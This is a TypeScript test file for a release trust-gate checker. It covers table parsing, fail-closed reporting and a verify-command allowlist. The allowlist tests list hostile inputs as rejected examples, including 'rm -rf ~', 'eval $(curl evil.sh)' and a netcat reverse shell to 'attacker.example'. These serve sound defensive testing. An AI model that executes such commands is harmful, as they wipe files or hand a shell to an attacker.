/**
 * gate-check.test.ts
 *
 * Tests parsing of the trust-gate table and the dry-run / executable-detection
 * logic. We do NOT execute the live verify commands — those touch live infra.
 */

import { describe, expect, it } from "bun:test";
import {
  GATE_LABELS,
  MILESTONE_TO_GATE,
  isExecutable,
  isVerifyCommandAllowed,
  parseCliArgs,
  parseGateTable,
  runChecklist,
  runGateRow,
  VERIFY_COMMAND_ALLOWLIST,
  type GateRow,
} from "../scripts/check-gate-table.ts";

const SYNTHETIC_TABLE = `
## Phase 0: Trust Gate Check

### Gate 1: "Every Package Verified"
**When:** Before S2-22

| # | Check | How To Verify |
|---|-------|---------------|
| G1-1 | First check | \`true\` |
| G1-2 | Manual gate | Manual review by sponsor |
| G1-3 | Failing check | \`false\` |

### Gate 2: "Every Publisher Known"
**When:** Before S2-32

| # | Check | How To Verify |
|---|-------|---------------|
| G2-1 | INC-001 closed | \`echo closed\` |

### Gate 3: "Trust Story First"

| # | Check | How To Verify |
|---|-------|---------------|
| G3-1 | First viewport | Screenshot |

### Gate 4: "Dogfood the Pipeline"

| # | Check | How To Verify |
|---|-------|---------------|
| G4-1 | Non-Steward submission | Submission record |

## Phase 1: Pre-Deploy

| Should not parse | because | Phase 1 ends Phase 0 |
`;

describe("parseGateTable", () => {
  const rows = parseGateTable(SYNTHETIC_TABLE);

  it("extracts every gate row across all four gates", () => {
    expect(rows.length).toBe(6); // 3 + 1 + 1 + 1
  });

  it("does not bleed into Phase 1 rows", () => {
    expect(rows.find((r) => r.name === "because")).toBeUndefined();
  });

  it("tags each row with the correct gate number + label", () => {
    const g1 = rows.find((r) => r.id === "G1-1");
    expect(g1?.gateNumber).toBe(1);
    expect(g1?.gateLabel).toBe("Every Package Verified");
  });

  it("maps gate numbers to milestone keys", () => {
    expect(rows.find((r) => r.id === "G1-1")?.milestone).toBe("S2-22");
    expect(rows.find((r) => r.id === "G2-1")?.milestone).toBe("S2-32");
    expect(rows.find((r) => r.id === "G3-1")?.milestone).toBe("S2-30");
    expect(rows.find((r) => r.id === "G4-1")?.milestone).toBe("external-onramp");
  });

  it("preserves the verify cell verbatim", () => {
    expect(rows.find((r) => r.id === "G1-1")?.verify).toBe("`true`");
    expect(rows.find((r) => r.id === "G1-2")?.verify).toBe("Manual review by sponsor");
  });
});

describe("isExecutable", () => {
  it("treats backtick-wrapped strings as executable", () => {
    expect(isExecutable("`echo hi`")).toBe(true);
  });

  it("treats prose as non-executable", () => {
    expect(isExecutable("Manual review by sponsor")).toBe(false);
  });
});

describe("runGateRow dry-run", () => {
  const row: GateRow = {
    id: "G1-1",
    gateNumber: 1,
    gateLabel: "Every Package Verified",
    milestone: "S2-22",
    name: "First check",
    verify: "`true`",
  };

  it("returns skipped status in dry-run mode", () => {
    const result = runGateRow(row, { dryRun: true });
    expect(result.status).toBe("skipped");
    expect(result.output).toContain("dry-run");
  });

  it("returns skipped for manual (non-executable) cells", () => {
    const manual: GateRow = { ...row, id: "G1-2", verify: "Manual review by sponsor" };
    const result = runGateRow(manual);
    expect(result.status).toBe("skipped");
    expect(result.output).toContain("manual gate");
  });
});

describe("runChecklist filtering", () => {
  const rows = parseGateTable(SYNTHETIC_TABLE);

  it("filters by milestone", () => {
    const report = runChecklist(rows, { dryRun: true, milestone: "S2-22" });
    expect(report.gates.length).toBe(3);
    for (const g of report.gates) expect(g.milestone).toBe("S2-22");
  });

  it("returns allPassed=true when every row is skipped (dry-run)", () => {
    const report = runChecklist(rows, { dryRun: true });
    expect(report.allPassed).toBe(true);
  });

  it("returns allPassed=false when any row fails", () => {
    const failingRow: GateRow = {
      id: "X-1",
      gateNumber: 1,
      gateLabel: "Every Package Verified",
      milestone: "S2-22",
      name: "Forced fail",
      verify: "`false`",
    };
    // Run live (not dry) — `false` is a safe shell builtin that exits non-zero.
    const report = runChecklist([failingRow]);
    expect(report.allPassed).toBe(false);
    expect(report.gates[0]?.status).toBe("fail");
  });

  it("returns allPassed=true for a single passing live row", () => {
    const passingRow: GateRow = {
      id: "X-2",
      gateNumber: 1,
      gateLabel: "Every Package Verified",
      milestone: "S2-22",
      name: "Forced pass",
      verify: "`true`",
    };
    const report = runChecklist([passingRow]);
    expect(report.allPassed).toBe(true);
    expect(report.gates[0]?.status).toBe("pass");
  });
});

describe("parseCliArgs", () => {
  it("parses --milestone", () => {
    const parsed = parseCliArgs(["--milestone", "S2-22"]);
    expect(parsed.milestone).toBe("S2-22");
  });

  it("parses --dry-run", () => {
    const parsed = parseCliArgs(["--dry-run"]);
    expect(parsed.dryRun).toBe(true);
  });

  it("parses --checklist with explicit path", () => {
    const parsed = parseCliArgs(["--checklist", "/tmp/x.md"]);
    expect(parsed.checklist).toBe("/tmp/x.md");
  });

  it("rejects unknown milestone", () => {
    expect(() => parseCliArgs(["--milestone", "bogus"])).toThrow();
  });

  it("flags --help", () => {
    expect(parseCliArgs(["--help"]).help).toBe(true);
  });
});

describe("milestone constants", () => {
  it("declares all four milestones", () => {
    expect(Object.keys(MILESTONE_TO_GATE).sort()).toEqual([
      "S2-22",
      "S2-30",
      "S2-32",
      "external-onramp",
    ]);
  });

  it("labels every gate", () => {
    for (const n of [1, 2, 3, 4]) expect(GATE_LABELS[n]).toBeTruthy();
  });
});

// ---------------------------------------------------------------------------
// Echo's review on release-manager#2 — regression tests for the trust-gate
// fail-closed semantics, allowlist enforcement, and parser tightening.
// ---------------------------------------------------------------------------

describe("runChecklist — empty rows fail-closed (Echo blocker)", () => {
  it("returns allPassed=false when there are zero rows (NOT silent green)", () => {
    // Regression: previously `[].every(...)` returned true so an unparseable
    // gate table emitted allPassed=true and DeployStaged read it as a green
    // light. Empty rows must be the loudest possible halt.
    const report = runChecklist([]);
    expect(report.allPassed).toBe(false);
    expect(report.reason).toBeDefined();
    expect(report.reason).toContain("no gates parsed");
    expect(report.gates).toEqual([]);
    expect(report.manualGatesPending).toBe(0);
  });

  it("returns allPassed=false when milestone filter matches no rows", () => {
    const unrelated: GateRow = {
      id: "X-9",
      gateNumber: 1,
      gateLabel: "Every Package Verified",
      milestone: "S2-22",
      name: "irrelevant",
      verify: "`true`",
    };
    const report = runChecklist([unrelated], { milestone: "external-onramp" });
    expect(report.allPassed).toBe(false);
    expect(report.reason).toContain("no gates parsed");
    expect(report.reason).toContain("external-onramp");
  });

  it("treats a synthetic broken markdown body as fail-closed", () => {
    // parseGateTable returns [] for any markdown that doesn't contain a
    // recognisable Phase 0 / Gate / row triplet — and runChecklist must then
    // fail closed.
    const broken = "# Some Doc\n\nNo gate tables here at all.\n";
    const rows = parseGateTable(broken);
    expect(rows).toEqual([]);
    const report = runChecklist(rows);
    expect(report.allPassed).toBe(false);
    expect(report.reason).toContain("no gates parsed");
  });
});

describe("runChecklist — skipped rows do NOT count toward allPassed (Echo major #2)", () => {
  it("returns allPassed=false when every row is a manual (skipped) cell, non-dry-run", () => {
    // Regression: previously skipped rows passed allPassed identically to
    // executed passes. An all-manual milestone must surface as pending, not
    // green.
    const allManual: GateRow[] = [
      {
        id: "M-1",
        gateNumber: 3,
        gateLabel: "Trust Story First",
        milestone: "S2-30",
        name: "Manual screenshot review",
        verify: "Screenshot",
      },
      {
        id: "M-2",
        gateNumber: 3,
        gateLabel: "Trust Story First",
        milestone: "S2-30",
        name: "Sponsor sign-off",
        verify: "Manual review by sponsor",
      },
    ];
    const report = runChecklist(allManual);
    expect(report.allPassed).toBe(false);
    expect(report.reason).toContain("no executed passes");
    expect(report.manualGatesPending).toBe(2);
  });

  it("requires ≥1 executed pass AND zero fails for allPassed=true", () => {
    // Mixed: one executed pass + one manual skip. The pass anchors allPassed
    // to true, but manualGatesPending surfaces the human follow-up.
    const mixed: GateRow[] = [
      {
        id: "P-1",
        gateNumber: 1,
        gateLabel: "Every Package Verified",
        milestone: "S2-22",
        name: "Live pass",
        verify: "`true`",
      },
      {
        id: "M-1",
        gateNumber: 1,
        gateLabel: "Every Package Verified",
        milestone: "S2-22",
        name: "Manual sponsor check",
        verify: "Manual review by sponsor",
      },
    ];
    const report = runChecklist(mixed);
    expect(report.allPassed).toBe(true);
    expect(report.manualGatesPending).toBe(1);
  });

  it("dry-run keeps allPassed=true and manualGatesPending=0 by design", () => {
    // Dry-run is informational; it short-circuits the manual-pending logic
    // so operators can inspect parsed rows without false alarms.
    const rows: GateRow[] = [
      {
        id: "P-1",
        gateNumber: 1,
        gateLabel: "Every Package Verified",
        milestone: "S2-22",
        name: "x",
        verify: "`true`",
      },
    ];
    const report = runChecklist(rows, { dryRun: true });
    expect(report.allPassed).toBe(true);
    expect(report.manualGatesPending).toBe(0);
  });
});

describe("VERIFY_COMMAND_ALLOWLIST (Echo major #3 — hardening)", () => {
  it("permits common release-tooling prefixes", () => {
    expect(isVerifyCommandAllowed("gh issue view 42")).toBe(true);
    expect(isVerifyCommandAllowed("git log --oneline")).toBe(true);
    expect(isVerifyCommandAllowed("bun run check")).toBe(true);
    expect(isVerifyCommandAllowed("bunx wrangler --version")).toBe(true);
    expect(isVerifyCommandAllowed("test -f /tmp/x")).toBe(true);
    expect(isVerifyCommandAllowed("[ -f /tmp/x ]")).toBe(true);
    expect(isVerifyCommandAllowed("curl -fsS https://example.com")).toBe(true);
    expect(isVerifyCommandAllowed("true")).toBe(true);
    expect(isVerifyCommandAllowed("false")).toBe(true);
  });

  it("rejects shell-meta payloads and unknown binaries", () => {
    expect(isVerifyCommandAllowed("rm -rf ~")).toBe(false);
    expect(isVerifyCommandAllowed("eval $(curl evil.sh)")).toBe(false);
    expect(isVerifyCommandAllowed(": $(rm -rf /)")).toBe(false);
    expect(isVerifyCommandAllowed("$(echo pwn)")).toBe(false);
    expect(isVerifyCommandAllowed("nc -e /bin/sh attacker.example 4444")).toBe(false);
  });

  it("runGateRow records non-allowlisted commands as fail (not executed)", () => {
    // Regression: any verify cell that isn't in the allowlist must produce a
    // structured fail with the allowlist reason — never reach spawnSync.
    const malicious: GateRow = {
      id: "X-1",
      gateNumber: 1,
      gateLabel: "Every Package Verified",
      milestone: "S2-22",
      name: "Hostile cell",
      verify: "`rm -rf ~`",
    };
    const result = runGateRow(malicious);
    expect(result.status).toBe("fail");
    expect(result.output).toContain("not in allowlist");
  });

  it("VERIFY_COMMAND_ALLOWLIST is exported as a RegExp for downstream introspection", () => {
    expect(VERIFY_COMMAND_ALLOWLIST).toBeInstanceOf(RegExp);
  });
});

describe("parseGateTable — Phase 0 terminator (Echo nit #6)", () => {
  it("terminates at the next H2 (not just '## Phase 1:'), once a gate row was seen", () => {
    // Regression: the OLD terminator was `^## Phase 1:` only, so a future
    // reorg ("## Phase A: …") would silently swallow non-gate rows. The new
    // contract is "Phase 0 ends at the next H2 once we've started parsing
    // gates".
    const reorganised = `
## Phase 0: Trust Gate Check

### Gate 1: "Every Package Verified"
**When:** Before S2-22

| # | Check | How To Verify |
|---|-------|---------------|
| G1-1 | First check | \`true\` |

## Other H2 That Is Not Phase 1

| Should not | parse | as a gate row |
| G9-9 | leaked row | \`echo leaked\` |
`;
    const rows = parseGateTable(reorganised);
    expect(rows.length).toBe(1);
    expect(rows[0]?.id).toBe("G1-1");
    expect(rows.find((r) => r.id === "G9-9")).toBeUndefined();
  });

  it("does not let a leading '## Overview' H2 (before Phase 0) terminate the scan early", () => {
    // The terminator only fires after at least one gate row has been seen,
    // so leading H2s above Phase 0 don't break parsing.
    const withPreamble = `
## Overview

Some preamble text.

## Phase 0: Trust Gate Check

### Gate 1: "Every Package Verified"

| # | Check | How To Verify |
|---|-------|---------------|
| G1-1 | First check | \`true\` |

## Phase 1: Pre-Deploy
`;
    const rows = parseGateTable(withPreamble);
    expect(rows.length).toBe(1);
    expect(rows[0]?.id).toBe("G1-1");
  });
});
